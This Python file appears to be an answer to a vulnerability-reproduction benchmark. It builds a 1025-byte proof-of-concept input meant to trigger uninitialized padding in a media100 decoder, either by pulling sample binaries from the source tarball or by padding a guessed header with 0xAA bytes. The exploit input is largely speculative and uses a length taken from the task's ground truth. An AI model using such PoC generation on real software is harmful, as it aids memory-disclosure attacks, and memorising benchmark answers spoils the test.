import os
import tarfile
import tempfile
import subprocess
import shutil
from pathlib import Path

class Solution:
    def solve(self, src_path: str) -> bytes:
        # Create temporary directory
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir_path = Path(tmpdir)
            
            # Extract source tarball
            with tarfile.open(src_path, 'r:*') as tar:
                tar.extractall(tmpdir)
            
            # Look for test files that might contain sample media100 data
            sample_data = self._find_sample_data(tmpdir_path)
            if sample_data:
                # Ensure exactly 1025 bytes as specified in ground truth
                if len(sample_data) >= 1025:
                    return sample_data[:1025]
                else:
                    return sample_data + b'\x00' * (1025 - len(sample_data))
            
            # Fallback: generate pattern that triggers buffer allocation with padding
            # This creates a media100-like header followed by data that should trigger
            # the specific code path where padding isn't cleared
            return self._generate_poc()

    def _find_sample_data(self, root_path: Path) -> bytes | None:
        """Search for sample media100 files or test data in the source tree."""
        # Common media100 file extensions and patterns
        patterns = [
            '*.media100',
            '*media100*',
            '*test*.bin',
            '*sample*.bin',
            '*data*.bin'
        ]
        
        for pattern in patterns:
            for path in root_path.rglob(pattern):
                if path.is_file() and path.stat().st_size > 0:
                    try:
                        data = path.read_bytes()
                        # Check if it looks like media100 data (has some header-like bytes)
                        if len(data) >= 4 and any(data[:4]):
                            return data
                    except:
                        continue
        
        # Look in test directories for any binary data
        test_dirs = ['test', 'tests', 'samples', 'data', 'testdata']
        for test_dir in test_dirs:
            test_path = root_path / test_dir
            if test_path.exists():
                for path in test_path.rglob('*'):
                    if path.is_file() and 0 < path.stat().st_size <= 8192:
                        try:
                            data = path.read_bytes()
                            # Skip text files
                            if b'\x00' in data[:100]:
                                return data
                        except:
                            continue
        
        return None

    def _generate_poc(self) -> bytes:
        """Generate a PoC that should trigger the uninitialized padding vulnerability."""
        # Start with a plausible media100 header
        # 4 bytes: magic number (guessed)
        header = b'M100'
        
        # 4 bytes: width (256)
        header += (256).to_bytes(4, 'little')
        
        # 4 bytes: height (256)
        header += (256).to_bytes(4, 'little')
        
        # 4 bytes: frame count (1)
        header += (1).to_bytes(4, 'little')
        
        # 4 bytes: flags (0)
        header += b'\x00\x00\x00\x00'
        
        # Add payload to reach exactly 1025 bytes
        # The vulnerability is in padding, so we need data that causes
        # the output buffer to have uninitialized padding at the end
        payload_size = 1025 - len(header)
        
        # Fill with pattern that might trigger specific allocation sizes
        # 0xAA pattern is often used for uninitialized memory detection
        payload = b'\xAA' * payload_size
        
        poc = header + payload
        
        # Ensure exact length
        return poc[:1025]